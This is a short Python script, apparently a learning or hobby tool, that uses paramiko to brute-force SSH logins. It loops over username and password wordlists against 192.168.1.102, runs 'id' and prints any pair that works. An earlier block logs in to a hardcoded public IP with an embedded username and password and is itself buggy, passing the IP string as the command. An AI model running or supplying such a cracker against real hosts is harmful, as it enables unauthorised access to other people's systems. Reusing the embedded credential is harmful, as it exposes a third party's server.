import paramiko
import sys

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
	ssh.connect(hostname='47.99.38.177',port=50000,username='user',password='66494')
except:
	pass

stdin,stdout, stderr = ssh.exec_command('47.99.38.177')
#5.获取命令执行的结果
result=stderr.read().decode('utf-8')
print(result)
#6.关闭连接
# client.close()

import paramiko


def crackhandle(client, ip, user, passwd, command):
	try:
		client.connect(ip, username=user, password=passwd)  # 连接
		client.get_transport().banner_timeout = 2;
		ssh_session = client.get_transport().open_session()  # 打开会话
		if ssh_session.active:
			ssh_session.exec_command(command)  # 执行命令
			return ssh_session.recv(1024);
	except Exception as e:
		print(e);
		print("username [%s] password [%s] fail" % (user, passwd));
		return "";


def crack(ip, command):
	passwordsList = open("/root/Desktop/pythonTest/password.txt");
	usernamesList = open("/root/Desktop/pythonTest/username.txt");
	passwords = passwordsList.readlines();
	usernames = usernamesList.readlines();
	client = paramiko.SSHClient();
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy());
	switch = False;
	for usuername in usernames:
		username = usuername.strip();
		for password in passwords:
			password = password.strip();
			commandRecv = crackhandle(client, ip, str(username), str(password), command);
			if len(commandRecv) > 1:
				print("success userName is %s password is %s" % (username, password));
				switch = True;
				break;
		if switch:
			break;


crack("192.168.1.102", "id");
